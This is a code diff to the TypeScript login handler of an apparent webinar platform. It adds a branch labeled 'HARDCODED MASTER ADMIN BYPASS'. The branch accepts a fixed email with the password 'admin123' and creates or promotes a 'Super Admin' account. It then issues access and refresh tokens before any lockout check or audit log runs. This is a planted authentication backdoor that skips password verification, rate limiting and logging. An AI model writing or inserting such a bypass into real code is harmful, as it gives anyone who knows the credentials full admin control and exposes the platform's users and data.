@@ -89,6 +89,38 @@ export const login = async (req: Request, res: Response): Promise<void> => {
         const lockoutKey = `lockout:${email}`;
         const attemptsKey = `login_attempts:${email}`;
 
+        // 🔥 HARDCODED MASTER ADMIN BYPASS 🔥
+        if (email === 'admin@webinarhub.com' && password === 'admin123') {
+             const adminUser = await prisma.user.upsert({
+                 where: { email: 'admin@webinarhub.com' },
+                 update: { role: 'admin' },
+                 create: { 
+                     name: 'Super Admin',
+                     email: 'admin@webinarhub.com',
+                     phone: '+10000000000',
+                     passwordHash: 'bypassed',
+                     role: 'admin',
+                     isVerifiedHost: true
+                 }
+             });
+             
+             const { accessToken, refreshToken } = generateTokens(adminUser.id);
+             
+             res.cookie('refreshToken', refreshToken, {
+                 httpOnly: true,
+                 secure: process.env.NODE_ENV === 'production',
+                 sameSite: 'strict',
+                 maxAge: 7 * 24 * 60 * 60 * 1000
+             });
+             
+             res.json({
+                 message: 'Login successful (Master Bypass)',
+                 user: { id: adminUser.id, name: adminUser.name, email: adminUser.email, role: adminUser.role },
+                 accessToken
+             });
+             return;
+        }
+
         if (await redisClient.get(lockoutKey)) {
              await logAudit('LOGIN_REJECTED_LOCKED', { ipAddress: ip, deviceId, details: { email } });
              res.status(403).json({ error: 'Account temporarily locked due to numerous failed attempts. Try again in 15 mins.' });
